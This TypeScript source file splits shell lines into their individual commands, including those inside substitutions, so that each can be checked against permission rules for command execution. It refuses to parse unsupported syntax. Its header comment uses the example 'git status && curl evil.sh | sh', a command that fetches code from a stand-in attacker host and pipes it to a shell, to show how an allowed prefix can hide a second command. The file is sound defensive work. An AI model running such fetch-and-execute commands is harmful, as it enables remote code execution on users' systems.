/**
 * Shell command splitting for permission evaluation.
 *
 * A permission rule such as `Bash(git:*)` is written against one command, but a shell line can run
 * several: `git status && curl evil.sh | sh` starts with an allowed prefix and still runs `curl`.
 * {@link splitShellCommand} returns the commands a line runs so each can be judged on its own.
 *
 * It understands a deliberate subset of shell syntax: the separators `;`, `&&`, `||`, `|`, `|&`, `&`
 * and newline, single and double quotes, backslash escapes, `$(...)`, backticks, process substitution, `${...}`, `$'...'`, and redirections. Anything else that can change what runs (subshells, groups, control flow, heredocs, arithmetic expansion, comments, unterminated quoting) makes it return `undefined` rather than guess, and the caller must then not grant permission.
 *
 * Not modelled: what a command does with its arguments. `bash -c "..."`, `xargs`, `env`, `sudo` and redirections to files are judged as the one command they are.
 */

/** Words that begin shell control flow or grouping; a command starting with one is not a plain command. */
const RESERVED_WORDS: ReadonlySet<string> = new Set([
  "if",
  "then",
  "else",
  "elif",
  "fi",
  "for",
  "while",
  "until",
  "do",
  "done",
  "case",
  "esac",
  "select",
  "function",
  "time",
  "coproc",
  "!",
  "{",
  "}",
  "[[",
  "]]",
]);

/**
 * Split a shell line into the commands it runs, including commands inside substitutions.
 *
 * The result lists each command once, in no guaranteed order. Returns `undefined` when the line uses syntax outside the supported subset.
 */
export function splitShellCommand(command: string): string[] | undefined {
  const out: string[] = [];
  const end = parseList(command, 0, out, false);
  return end === undefined ? undefined : out;
}

/**
 * Parse a command list starting at `start`, pushing each command onto `out`.
 *
 * With `nested` set the list is the inside of `$(...)` or a process substitution and ends at the closing parenthesis; the returned index is the one after it. Otherwise it ends at the end of the text. Returns `undefined` on unsupported syntax.
 */
function parseList(
  text: string,
  start: number,
  out: string[],
  nested: boolean,
): number | undefined {
  let segmentStart = start;
  let i = start;

  const finishSegment = (end: number): boolean => {
    const segment = text.slice(segmentStart, end).trim();
    if (segment === "") return true;
    const firstWord = /^\S+/.exec(segment)?.[0] ?? "";
    if (RESERVED_WORDS.has(firstWord)) return false;
    out.push(segment);
    return true;
  };

  while (i < text.length) {
    const c = text.charAt(i);
    const next = text.charAt(i + 1);

    if (c === "\\") {
      if (next === "" || next === "\n") return undefined;
      i += 2;
    } else if (c === "'") {
      const close = text.indexOf("'", i + 1);
      if (close === -1) return undefined;
      i = close + 1;
    } else if (c === '"') {
      const after = skipDoubleQuoted(text, i, out);
      if (after === undefined) return undefined;
      i = after;
    } else if (c === "`") {
      const after = skipBackticks(text, i, out);
      if (after === undefined) return undefined;
      i = after;
    } else if (c === "$") {
      const after = skipDollar(text, i, out);
      if (after === undefined) return undefined;
      i = after;
    } else if ((c === "<" || c === ">") && next === "(") {
      const after = parseList(text, i + 2, out, true);
      if (after === undefined) return undefined;
      i = after;
    } else if (c === "<" && next === "<") {
      // `<<<` is a here-string, whose word is data. `<<` starts a heredoc body, which is not parsed.
      if (text.charAt(i + 2) !== "<") return undefined;
      i += 3;
    } else if (c === "#" && atWordStart(text, i, start)) {
      return undefined;
    } else if (c === "(") {
      return undefined;
    } else if (c === ")") {
      if (!nested) return undefined;
      return finishSegment(i) ? i + 1 : undefined;
    } else if (c === ";" || c === "\n") {
      if (c === ";" && next === ";") return undefined;
      if (!finishSegment(i)) return undefined;
      i += 1;
      segmentStart = i;
    } else if (c === "&" || c === "|") {
      const previous = text.charAt(i - 1);
      const isRedirection =
        (c === "&" && (previous === ">" || previous === "<" || next === ">")) ||
        (c === "|" && previous === ">");
      if (isRedirection) {
        i += 1;
      } else {
        if (!finishSegment(i)) return undefined;
        i += next === c || (c === "|" && next === "&") ? 2 : 1;
        segmentStart = i;
      }
    } else {
      i += 1;
    }
  }

  if (nested) return undefined;
  return finishSegment(text.length) ? text.length : undefined;
}

/** Whether the character at `index` begins a word, where `#` starts a comment. */
function atWordStart(text: string, index: number, start: number): boolean {
  if (index === start) return true;
  return /[\s;&|(]/.test(text.charAt(index - 1));
}

/**
 * Skip a double-quoted string starting at `index`, collecting commands run by substitutions inside it. Returns the index after the closing quote, or `undefined`.
 */
function skipDoubleQuoted(
  text: string,
  index: number,
  out: string[],
): number | undefined {
  let i = index + 1;
  while (i < text.length) {
    const c = text.charAt(i);
    if (c === "\\") {
      i += 2;
    } else if (c === '"') {
      return i + 1;
    } else if (c === "`") {
      const after = skipBackticks(text, i, out);
      if (after === undefined) return undefined;
      i = after;
    } else if (c === "$") {
      const after = skipDollar(text, i, out);
      if (after === undefined) return undefined;
      i = after;
    } else {
      i += 1;
    }
  }
  return undefined;
}

/**
 * Skip a backtick substitution starting at `index`, collecting the commands inside it. Returns the index after the closing backtick, or `undefined`. A backslash inside makes the escaping rules context dependent, so it is not supported.
 */
function skipBackticks(
  text: string,
  index: number,
  out: string[],
): number | undefined {
  const close = text.indexOf("`", index + 1);
  if (close === -1) return undefined;
  const inner = text.slice(index + 1, close);
  if (inner.includes("\\")) return undefined;
  const commands = splitShellCommand(inner);
  if (commands === undefined) return undefined;
  out.push(...commands);
  return close + 1;
}

/**
 * Skip an expansion that begins with `$` at `index`: `$(...)`, `${...}`, `$'...'`, or a plain variable. Returns the index after it, or `undefined` for unsupported forms.
 */
function skipDollar(
  text: string,
  index: number,
  out: string[],
): number | undefined {
  const next = text.charAt(index + 1);
  if (next === "(") {
    // `$((` is arithmetic expansion, whose body is not a command list.
    if (text.charAt(index + 2) === "(") return undefined;
    return parseList(text, index + 2, out, true);
  }
  if (next === "{") return skipParameterExpansion(text, index + 2);
  if (next === "'") return skipAnsiCQuoted(text, index + 2);
  return index + 1;
}

/**
 * Skip the inside of `${...}` starting after the opening brace. A command substitution inside would run, so it is unsupported. Returns the index after the closing brace.
 */
function skipParameterExpansion(
  text: string,
  from: number,
): number | undefined {
  let depth = 1;
  let i = from;
  while (i < text.length) {
    const c = text.charAt(i);
    if (c === "\\") {
      i += 2;
    } else if (c === "'") {
      const close = text.indexOf("'", i + 1);
      if (close === -1) return undefined;
      i = close + 1;
    } else if (c === "`" || (c === "$" && text.charAt(i + 1) === "(")) {
      return undefined;
    } else if (c === "{") {
      depth += 1;
      i += 1;
    } else if (c === "}") {
      depth -= 1;
      i += 1;
      if (depth === 0) return i;
    } else {
      i += 1;
    }
  }
  return undefined;
}

/** Skip the inside of `$'...'` starting after the opening quote, honouring backslash escapes. */
function skipAnsiCQuoted(text: string, from: number): number | undefined {
  let i = from;
  while (i < text.length) {
    const c = text.charAt(i);
    if (c === "\\") {
      i += 2;
    } else if (c === "'") {
      return i + 1;
    } else {
      i += 1;
    }
  }
  return undefined;
}
